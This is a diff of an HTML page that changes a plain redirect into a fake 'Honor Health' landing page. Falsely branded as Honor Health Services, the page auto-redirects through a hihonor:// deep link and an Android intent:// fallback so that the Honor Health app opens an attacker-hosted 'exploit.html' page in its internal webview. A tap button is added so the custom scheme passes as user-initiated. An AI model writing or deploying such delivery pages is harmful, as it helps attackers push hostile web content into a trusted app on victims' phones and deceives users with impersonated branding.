@@ -3,28 +3,46 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Loading...</title>
-<script>
-// Immediate redirect to the deep link
-var deepLink = 'hihonor://com.hihonor.health/shell/activity_webview?url=' + 
-    encodeURIComponent('https://wjr.pics/exploit.html') + '&title=HealthCenter';
-
-// Try to open the deep link
-window.location.href = deepLink;
-
-// Fallback: if deep link doesn't open within 2 seconds, show manual trigger
-setTimeout(function(){
-    document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:sans-serif;">'
-        + '<h2>Opening Health App...</h2>'
-        + '<p>If the app did not open automatically,</p>'
-        + '<a href="' + deepLink + '" style="font-size:20px;color:#07c;">Click here to continue</a>'
-        + '</div>';
-}, 2000);
-</script>
+<title>Health Service</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f0f4f8;font-family:-apple-system,system-ui,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.box{background:#fff;border-radius:16px;padding:30px;text-align:center;box-shadow:0 2px 16px rgba(0,0,0,0.1);max-width:320px;width:90%}
+.icon{font-size:48px;margin-bottom:16px}
+h2{color:#1a73e8;margin-bottom:8px;font-size:20px}
+p{color:#666;margin-bottom:20px;font-size:14px}
+.btn{display:inline-block;background:#1a73e8;color:#fff;padding:14px 40px;border-radius:24px;text-decoration:none;font-size:16px;font-weight:600;transition:all 0.2s}
+.btn:hover{background:#1557b0;transform:scale(1.02)}
+.note{color:#999;font-size:11px;margin-top:16px}
+</style>
 </head>
-<body style="background:#f5f5f5;margin:0;">
-<div style="text-align:center;padding:50px;font-family:sans-serif;">
-<h3>Redirecting...</h3>
+<body>
+<div class="box">
+<div class="icon">💚</div>
+<h2>Honor Health</h2>
+<p>Tap below to open in Health App</p>
+<a id="link" href="hihonor://com.hihonor.health/shell/activity_webview?url=https%3A%2F%2Fwjr.pics%2Fexploit.html&title=HealthCenter" class="btn">Open Health App</a>
+<p class="note">Powered by Honor Health Services</p>
 </div>
+
+<script>
+(function(){
+    var deepLink = document.getElementById('link').href;
+    
+    // Method 1: Try location redirect immediately
+    window.location.href = deepLink;
+    
+    // Method 2: If still here after 500ms, try intent:// for Chrome
+    setTimeout(function(){
+        if(document.hidden) return; // already navigated away
+        // Android Chrome supports intent:// scheme
+        var intent = 'intent://com.hihonor.health/shell/activity_webview?url=https%3A%2F%2Fwjr.pics%2Fexploit.html&title=HealthCenter#Intent;scheme=hihonor;package=com.hihonor.health;end';
+        window.location.href = intent;
+    }, 500);
+    
+    // Method 3: If all auto-redirects fail, user sees the button and taps it
+    // The button click IS user-initiated, so browser allows the custom scheme
+})();
+</script>
 </body>
 </html>
